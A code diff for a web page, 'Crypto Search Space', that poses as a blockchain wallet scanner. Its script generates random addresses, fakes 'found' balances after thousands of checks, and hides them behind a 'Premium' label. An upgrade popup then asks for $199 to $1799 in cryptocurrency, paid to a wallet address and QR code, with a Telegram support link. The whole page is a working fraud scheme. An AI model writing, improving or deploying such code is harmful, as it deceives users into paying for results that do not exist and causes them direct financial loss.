@@ -143,6 +143,26 @@
     .btn-stop { background: var(--warning); color: white; }
     .btn-stop:hover { background: #ef6c00; }
 
+    /* Upgrade Modal */
+    #upgradeModal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background-color: rgba(0, 0, 0, 0.8);
+      z-index: 999;
+      justify-content: center;
+      align-items: center;
+    }
+    #upgradeModal .modal-content {
+      background: #222;
+      padding: 30px;
+      border-radius: 10px;
+      max-width: 400px;
+      width: 90%;
+      color: white;
+      position: relative;
+    }
+
     @media (max-width: 768px) {
       body { flex-direction: column; height: auto; }
       .sidebar {
@@ -170,9 +190,9 @@
     <h1>Crypto Search Space</h1>
     <button id="scannerBtn">🔍 Scanner</button>
     <button id="homeBtn">🏠 Home</button>
-    <button class="upgrade-btn" onclick="openUpgradePopup()">🔓 Upgrade Now</button>
+    <a href="https://t.me/cryptos_search_admin" target="_blank">📩 Support</a>
+    <a class="upgrade-btn" href="#" id="openUpgrade">🔓 Upgrade Now</a>
   </div>
-
   <div class="main">
     <div class="header">
       <div class="blockchains">
@@ -195,55 +215,118 @@
     </div>
   </div>
 
-  <div class="modal" id="upgradeModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); justify-content:center; align-items:center;">
+  <!-- ✅ Upgrade Modal Popup -->
+  <div id="upgradeModal">
     <div class="modal-content">
-      <h2>Select Plan</h2>
-      <select id="planSelect">
-        <option value="">-- Select a plan --</option>
-        <option value="199">⭐ One blockchain – $199</option>
-        <option value="399">⭐ Two blockchains – $399</option>
-        <option value="599">⭐ Three blockchains – $599</option>
-        <option value="799">⭐ Four blockchains – $799</option>
-        <option value="999">⭐ Five blockchains – $999</option>
-        <option value="1199">⭐ Six blockchains – $1199</option>
-        <option value="1399">⭐ Seven blockchains – $1399</option>
-        <option value="1599">⭐ Eight blockchains – $1599</option>
-        <option value="1799">⭐ Nine blockchains – $1799</option>
+      <h2 style="color:#4caf50;">Upgrade Plan</h2>
+      <p>Select a plan and send payment to the address below:</p>
+      <select id="planSelect" style="width:100%; padding:10px; margin-bottom:10px;">
+        <option value="199">One blockchain – $199</option>
+        <option value="399">Two blockchains – $399</option>
+        <option value="599">Three blockchains – $599</option>
+        <option value="799">Four blockchains – $799</option>
+        <option value="999">Five blockchains – $999</option>
+        <option value="1199">Six blockchains – $1199</option>
+        <option value="1399">Seven blockchains – $1399</option>
+        <option value="1599">Eight blockchains – $1599</option>
+        <option value="1799">Nine blockchains – $1799</option>
       </select>
-      <div id="qrSection" style="display:none;">
-        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgv8_XkL7hLIcN9aNOg7eskC7-o4NWD1wCF9jCHfbV-7BKPQNncb4ciN3-974pV-pgHhOPIhzL1IugDeBqCvFrifJF9j_rzffG-6bdaGdaDs8cYEikK6Lqv9v5WyJNngy10fY6tSkbq2g4xhOCmGwGTOAHnv0HQbVef1FgTJzG_14u_NBW1s9ASvgvKjh3w/s320/IMG_20250630_161301.jpg" style="margin-top:15px; width:200px;">
-        <div id="paymentAmount" style="margin-top:10px; font-weight:bold;"></div>
-        <div style="margin-top:5px; font-family:monospace;">0x56169808ee926359c3403c2049d77c574b40db32</div>
-      </div>
-      <button onclick="confirmUpgrade()">✅ Confirm</button>
-      <button onclick="closeUpgradePopup()" style="background:red; color:#fff;">Cancel</button>
+      <p><strong>BNB Address:</strong><br><code>bnb1234exampleWalletAddress</code></p>
+      <img src="https://raw.githubusercontent.com/1xbet-agent/crypto/main/IMG_20250630_161301.jpg" alt="QR Code" style="width:100%; border-radius:10px; margin:10px 0;" />
+      <button onclick="document.getElementById('upgradeModal').style.display='none'" style="background:#e91e63; color:white; border:none; padding:10px 20px; border-radius:6px; cursor:pointer;">Close</button>
     </div>
   </div>
 
   <script>
-    function openUpgradePopup() {
-      document.getElementById('upgradeModal').style.display = 'flex';
-      document.getElementById('planSelect').value = "";
-      document.getElementById('qrSection').style.display = 'none';
+    const startBtn = document.getElementById("startBtn");
+    const stopBtn = document.getElementById("stopBtn");
+    const scannerBtn = document.getElementById("scannerBtn");
+    const homeBtn = document.getElementById("homeBtn");
+    const walletList = document.getElementById("walletList");
+    const checkedCount = document.getElementById("checkedCount");
+    const foundCount = document.getElementById("foundCount");
+    const foundValueElem = document.getElementById("foundValue");
+
+    let checked = 0, found = 0, foundValue = 0, intervalId = null;
+
+    function generateWalletAddress(chain) {
+      const rand = () => Array(40).fill(0).map(() => Math.random().toString(36)[2]).join('').substring(0, 34);
+      if (chain === 'BTC') return '1' + rand();
+      if (chain === 'ETH' || chain === 'BNB') return '0x' + rand();
+      if (chain === 'DOGE') return 'D' + rand();
+      return 'TNdYAjGuMDGkvDXk8VGjmB8Ri9b91JTrRm';
     }
 
-    function closeUpgradePopup() {
-      document.getElementById('upgradeModal').style.display = 'none';
+    function getRandomBalance() {
+      return (Math.random() * (999 - 100) + 100).toFixed(2);
     }
 
-    document.getElementById('planSelect').addEventListener("change", function() {
-      const val = this.value;
-      if (val) {
-        document.getElementById('qrSection').style.display = 'block';
-        document.getElementById('paymentAmount').innerText = `Send $${val} to the wallet below:`;
-      } else {
-        document.getElementById('qrSection').style.display = 'none';
-      }
+    function getSelectedChains() {
+      return Array.from(document.querySelectorAll('.blockchains input:checked')).map(cb => cb.value);
+    }
+
+    function startSearch() {
+      if (intervalId) return;
+      checked = 0; found = 0; foundValue = 0;
+      walletList.innerHTML = "";
+      checkedCount.textContent = foundCount.textContent = "0";
+      foundValueElem.textContent = "0.00";
+      const chains = getSelectedChains();
+      if (!chains.length) return alert("Select at least one chain");
+      startBtn.disabled = true; stopBtn.disabled = false;
+
+      intervalId = setInterval(() => {
+        checked++;
+        const chain = chains[Math.floor(Math.random() * chains.length)];
+        const wallet = generateWalletAddress(chain);
+        const hasBalance = checked >= 7000 && Math.random() < 0.03;
+        const balance = hasBalance ? getRandomBalance() : "0.00";
+        const display = hasBalance ? "[Hidden - Premium]" : wallet;
+        const line = document.createElement("div");
+        line.innerHTML = `[${chain}] ${hasBalance ? "Balance: $" + balance + " ✔" : "Balance: ✘"} | <span class="wallet-address">${display}</span>`;
+        walletList.prepend(line);
+
+        checkedCount.textContent = checked;
+        if (hasBalance) {
+          found++;
+          foundValue += parseFloat(balance);
+          foundCount.textContent = found;
+          foundValueElem.textContent = foundValue.toFixed(2);
+          clearInterval(intervalId);
+          startBtn.disabled = false;
+          stopBtn.disabled = true;
+        }
+
+        if (checked >= 100000) {
+          clearInterval(intervalId);
+          startBtn.disabled = false;
+          stopBtn.disabled = true;
+        }
+      }, 50);
+    }
+
+    function stopSearch() {
+      clearInterval(intervalId);
+      intervalId = null;
+      startBtn.disabled = false;
+      stopBtn.disabled = true;
+    }
+
+    startBtn.addEventListener("click", startSearch);
+    stopBtn.addEventListener("click", stopSearch);
+    scannerBtn.addEventListener("click", startSearch);
+    homeBtn.addEventListener("click", () => {
+      stopSearch();
+      walletList.innerHTML = "";
+      checkedCount.textContent = foundCount.textContent = "0";
+      foundValueElem.textContent = "0.00";
     });
 
-    function confirmUpgrade() {
-      alert("✅ Please complete payment via the shown QR code or wallet address.");
-    }
+    // Upgrade Popup
+    document.getElementById("openUpgrade").addEventListener("click", function (e) {
+      e.preventDefault();
+      document.getElementById("upgradeModal").style.display = "flex";
+    });
   </script>
 </body>
 </html>
